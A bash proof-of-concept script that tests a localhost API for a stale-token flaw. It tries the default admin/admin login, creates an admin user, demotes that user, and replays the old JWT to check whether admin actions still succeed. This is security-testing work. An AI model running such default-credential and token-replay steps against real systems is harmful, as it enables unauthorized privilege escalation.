#!/bin/bash
API=http://localhost:8080/api/v1
NEWPW='Thesis-Pass-1234!'
jqpy(){ python3 -c "import sys,json;d=json.load(sys.stdin);print($1)" 2>/dev/null; }
claimval(){ python3 -c "import sys,base64,json;t='$1'.split('.')[1];t+='='*(-len(t)%4);print(json.loads(base64.urlsafe_b64decode(t)).get('$2'))" 2>/dev/null; }
login(){ curl -s -X POST $API/auth/login -H 'Content-Type: application/json' -d "{\"username\":\"$1\",\"password\":\"$2\"}" | jqpy "d.get('access_token','')"; }
writecode(){ local n="probe-$RANDOM$RANDOM"; curl -s -o /dev/null -w '%{http_code}' -X POST $API/users -H "Authorization: Bearer $1" -H 'Content-Type: application/json' -d "{\"username\":\"$n\",\"email\":\"$n@probe.test\",\"password\":\"$NEWPW\",\"is_admin\":false}"; }

echo "===== BOOTSTRAP ====="
A1=$(login admin admin); echo "admin login (default pw): token len ${#A1}"
AID=$(claimval "$A1" sub); echo "admin id: $AID"
echo "change admin pw -> $(curl -s -o /dev/null -w '%{http_code}' -X POST $API/users/$AID/password -H "Authorization: Bearer $A1" -H 'Content-Type: application/json' -d "{\"current_password\":\"admin\",\"new_password\":\"$NEWPW\"}")"
A=$(login admin "$NEWPW"); echo "admin re-login: token len ${#A}  is_admin=$(claimval "$A" is_admin)"
VC=$(curl -s -X POST $API/users -H "Authorization: Bearer $A" -H 'Content-Type: application/json' -d "{\"username\":\"victim\",\"email\":\"victim@probe.test\",\"password\":\"$NEWPW\",\"is_admin\":true}")
VID=$(echo "$VC" | jqpy "d.get('id') or d.get('user',{}).get('id')"); echo "victim created id=$VID"
echo "viewer create -> $(curl -s -o /dev/null -w '%{http_code}' -X POST $API/users -H "Authorization: Bearer $A" -H 'Content-Type: application/json' -d "{\"username\":\"viewer\",\"email\":\"viewer@probe.test\",\"password\":\"$NEWPW\",\"is_admin\":false}")"

echo; echo "===== MR-A1 ====="
VOLD=$(login victim "$NEWPW"); echo "[A] V_OLD is_admin claim = $(claimval "$VOLD" is_admin)"
echo "[B] source: victim(admin) create with V_OLD (expect 2xx) -> $(writecode "$VOLD")"
VW=$(login viewer "$NEWPW"); echo "[C] viewer create (expect 403) -> $(writecode "$VW")"
echo "[D] transition: admin PATCH /users/$VID is_admin=false (expect 2xx, no step-up) -> $(curl -s -o /dev/null -w '%{http_code}' -X PATCH $API/users/$VID -H "Authorization: Bearer $A" -H 'Content-Type: application/json' -d '{"is_admin":false}')"
VNEW=$(login victim "$NEWPW"); echo "[E] fresh victim is_admin claim=$(claimval "$VNEW" is_admin) ; fresh create (expect 403) -> $(writecode "$VNEW")"
echo "[F] *** REPLAY V_OLD create AFTER demotion (VULN expects 2xx = MR-A1 bug) -> $(writecode "$VOLD") ***"
echo "[poll] confirm V_OLD stays 2xx (claim-based, not 60s cache):"
for i in 1 2 3 4; do echo "   +$((i*8))s old=$(writecode "$VOLD") fresh=$(writecode "$VNEW")"; sleep 8; done
echo "[DONE]"
